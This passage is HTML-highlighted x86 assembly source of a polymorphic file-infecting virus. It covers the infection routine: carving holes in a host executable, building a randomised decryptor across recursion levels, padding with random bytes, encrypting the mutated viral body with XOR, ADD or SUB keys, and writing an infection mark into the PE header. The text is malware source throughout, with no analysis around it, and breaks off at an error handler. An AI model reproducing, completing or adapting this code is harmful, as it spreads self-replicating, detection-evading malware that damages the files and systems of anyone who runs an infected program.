                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Initialize the Undo buffer (for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfUndoActions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; undo the changes to</span><span class="sc0">
                                                </span><span class="sc1">; the file if we had an error)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PrepareFile</span><span class="sc0">    </span><span class="sc1">; Make the holes</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error4</span><span class="sc0">         </span><span class="sc1">; EAX != 0 if error, so exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; in the mapping where the</span><span class="sc0">
                                                  </span><span class="sc1">; decryptor must be.</span><span class="sc0">
</span><span class="sc1">;;;;;;</span><span class="sc0">
</span><span class="sc1">; Now we create the decryptor and we copy the code, which will be unencrypted</span><span class="sc0">
</span><span class="sc1">; once in every 16 infections</span><span class="sc0">
</span><span class="sc1">;;;;;;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the maximum size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">             </span><span class="sc1">; we can have for the decryptor</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SetSizeOfExpansionTo0</span><span class="sc0"> </span><span class="sc1">; If it's 400h, set a size of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; expansion to the Expander of</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0">  </span><span class="sc1">; 0 (three recursivity levels).</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetSizeOfExpansionTo0</span><span class="sc0"> </span><span class="sc1">; Also we can select randomly</span><span class="sc0">
                                              </span><span class="sc1">; that level instead of a deeper</span><span class="sc0">
                                              </span><span class="sc1">; one (genetically!)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Set the initial level to -1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetSizeOfExpansion</span><span class="sc0">    </span><span class="sc1">; (four levels of recursivity).</span><span class="sc0">
      </span><span class="sc5">@@SetSizeOfExpansionTo0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0">  </span><span class="sc1">; Get a random TRUE or FALSE</span><span class="sc0">
                                              </span><span class="sc1">; depending on previous</span><span class="sc0">
                                              </span><span class="sc1">; generations values.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; If FALSE, set only two levels</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetSizeOfExpansionTo1</span><span class="sc0"> </span><span class="sc1">; of recursivity (set the initial</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; level to 1)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetSizeOfExpansion</span><span class="sc0">
      </span><span class="sc5">@@SetSizeOfExpansionTo1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc5">@@SetSizeOfExpansion</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfExpansion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set -1, 0 or 1 (depending</span><span class="sc0">
                                                </span><span class="sc1">; on all the conditions above)</span><span class="sc0">

      </span><span class="sc5">@@CheckWithOtherSizeOfExpansion</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Set the number of times we'll try</span><span class="sc0">
                                       </span><span class="sc1">; to get a decryptor with a size that</span><span class="sc0">
                                       </span><span class="sc1">; fits into the maximum size set.</span><span class="sc0">
      </span><span class="sc5">@@GenerateOther</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; Save the count</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorPseudoCode</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the storage addr.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save this address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeDecryptor</span><span class="sc0">    </span><span class="sc1">; Make a decryptor for this infection</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Restore this address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; Decrease the number of times we</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; can repeat the decryptor generation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfDecryptor</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check the size of the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; new decryptor.</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SizeOfDecryptorOK</span><span class="sc0">             </span><span class="sc1">; If it fits, jump</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; ECX = 0?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GenerateOther</span><span class="sc0">              </span><span class="sc1">; If not, generate other</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfExpansion</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if the size of</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">             </span><span class="sc1">; expansion is already the minimum.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InsertExitProcess</span><span class="sc0">  </span><span class="sc1">; If it is, insert directly a call</span><span class="sc0">
                      </span><span class="sc1">; to ExitProcess (to make the host run without problems).</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; If not, decrease the recursivity</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfExpansion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; the expander can make and</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CheckWithOtherSizeOfExpansion</span><span class="sc0"> </span><span class="sc1">; try again.</span><span class="sc0">

    </span><span class="sc1">; Here we insert a call to ExitProcess if we couldn't generate a decryptor</span><span class="sc0">
    </span><span class="sc1">; following our specifications.</span><span class="sc0">
      </span><span class="sc5">@@InsertExitProcess</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the address for</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; code insertion</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Insert "PUSH 0"</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc1">;    xor     eax, eax</span><span class="sc0">
            </span><span class="sc1">;    mov     [edi], eax</span><span class="sc0">
            </span><span class="sc1">;    add     edi, 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">          </span><span class="sc1">; Insert "CALL ExitProcess"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Exit</span><span class="sc0">

      </span><span class="sc5">@@SizeOfDecryptorOK</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; Now let's copy the decryptor in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AssembledDecryptor</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; hole we made for it.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfDecryptor</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@LoopCopyDecryptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Copy the assembled decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCopyDecryptor</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; Maximum number of times we can</span><span class="sc0">
                                         </span><span class="sc1">; repeat the following:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfDecryptor</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFCh</span><span class="sc0">    </span><span class="sc1">; Get the remaining size of the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; decryptor aligned to DWORDs.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ContinueWithTheRest</span><span class="sc0"> </span><span class="sc1">; If 0, don't make this thing</span><span class="sc0">
       </span><span class="sc5">@@CheckAgainThePossibility</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Get a random number between 0 and 252</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; If 0, repeat</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckAgainThePossibility</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Decrease the number of times we can do</span><span class="sc0">
                                    </span><span class="sc1">; this again.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">; If the random number is below the</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@FillRandomBytes</span><span class="sc0"> </span><span class="sc1">; remaining size, go to fill some.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; If don't, and we can make it more</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckAgainThePossibility</span><span class="sc0"> </span><span class="sc1">; times, get another random</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueWithTheRest</span><span class="sc0">      </span><span class="sc1">; number.</span><span class="sc0">
      </span><span class="sc5">@@FillRandomBytes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; ECX = Number of random bytes to insert</span><span class="sc0">
      </span><span class="sc5">@@LoopFillRandomBytes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Insert a random DWORD</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Fill it with the random quantity we got</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopFillRandomBytes</span><span class="sc0"> </span><span class="sc1">; before</span><span class="sc0">

      </span><span class="sc5">@@ContinueWithTheRest</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_DataHole</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; of the data hole</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If it's 0, exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TypeOfEncryption</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the encryption</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptionKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; operation and the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; address of the new</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; mutated code</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFCh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; Round it</span><span class="sc0">
     </span><span class="sc5">@@LoopEncryptCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; Copy the code and encrypt it</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoEncryption</span><span class="sc0">       </span><span class="sc1">; on the fly</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADDKey</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SUBKey</span><span class="sc0">
        </span><span class="sc5">@@XORKey</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@StoreDWORD</span><span class="sc0">
        </span><span class="sc5">@@ADDKey</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@StoreDWORD</span><span class="sc0">
        </span><span class="sc5">@@SUBKey</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">@@NoEncryption</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@StoreDWORD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Store the encrypted (or not)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; DWORDs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopEncryptCode</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Set a 0 at the end</span><span class="sc0">

     </span><span class="sc5">@@Exit</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the infection mark (the CRC of</span><span class="sc0">
                                          </span><span class="sc1">; the executable to 0)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; Set "NO_ERROR" flag</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoError</span><span class="sc0">

     </span><span class="sc1">;; If the file is already infected or the headers doesn't meet the</span><span class="sc0">
     </span><span class="sc1">;; required characteristics, we jump here.</span><span class="sc0">
     </span><span class="sc5">@@Error4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UndoChanges</span><span class="sc0">  </span><span class="sc1">; Undo the changes to the file</span><span class="sc0">
